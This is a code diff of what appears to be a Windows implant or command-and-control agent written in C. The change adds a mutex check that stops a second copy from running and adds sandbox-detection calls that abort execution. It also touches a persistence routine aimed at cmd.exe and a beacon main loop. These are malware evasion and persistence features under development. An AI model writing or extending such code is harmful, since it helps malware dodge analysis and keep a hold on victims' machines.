@@ -2048,7 +2048,11 @@ CLEANUP:
 }
 
 void test125(void) {
-	PersistenceMethod2("C:\\System32\\cmd.exe");
+	PersistenceMethod2("C:\\Windows\\System32\\cmd.exe");
+}
+
+void test126(void) {
+	DetectSandbox1();
 }
 
 VOID DetectMonitorSystem(VOID)
@@ -2060,6 +2064,25 @@ VOID DetectMonitorSystem(VOID)
 
 		Sleep(1000);
 	}
+}
+
+BOOL IsExist
+(
+	PGLOBAL_CONFIG pConfig
+)
+{
+	LPSTR lpMutexName = NULL;
+	BOOL Result = FALSE;
+
+	lpMutexName = ComputeSHA256(pConfig->lpPeerPrivKey, lstrlenA(pConfig->lpPeerPrivKey));
+	lpMutexName[16] = '\0';
+	pConfig->hMutex = CreateMutexA(NULL, TRUE, lpMutexName);
+	if (pConfig->hMutex == NULL && GetLastError() == ERROR_ALREADY_EXISTS) {
+		Result = TRUE;
+	}
+
+	FREE(lpMutexName);
+	return Result;
 }
 
 VOID Final(VOID)
@@ -2128,6 +2151,10 @@ VOID Final(VOID)
 		LOG_ERROR("CreateThread", GetLastError());
 		goto CLEANUP;
 	}
+
+	if (DetectSandbox4() || DetectSandbox5()) {
+		goto CLEANUP;
+	}
 #endif
 
 	pGlobalConfig = ALLOC(sizeof(GLOBAL_CONFIG));
@@ -2145,6 +2172,10 @@ VOID Final(VOID)
 	pGlobalConfig->uPeerID = GeneratePeerID();
 	pGlobalConfig->dwListenerID = 1;
 	InitializeSRWLock(&pGlobalConfig->RWLock);
+	if (IsExist(pGlobalConfig)) {
+		goto CLEANUP;
+	}
+
 #ifdef _BEACON
 	pBeaconClient = BeaconInit(pGlobalConfig);
 	BeaconMainLoop(pBeaconClient);
@@ -2159,15 +2190,18 @@ CLEANUP:
 	if (hThread != NULL) {
 #ifndef _DEBUG
 		TerminateThread(hThread, 0);
-#endif
 		CloseHandle(hThread);
+#endif
 	}
 
 #ifdef _BEACON
 	FreeBeaconClient(pBeaconClient);
 #else
-	//FreeSessionClient(pSessionClient);
+	FreeSessionClient(pSessionClient);
 #endif
+	FreeGlobalConfig(pGlobalConfig);
+
+	return;
 }
 
 LONG VectoredExceptionHandler
@@ -2323,7 +2357,8 @@ int main(void) {
 	//test121();
 	//test122();
 	//test124();
-	test125();
+	//test125();
+	test126();
 	//Final();
 
 	return 0;
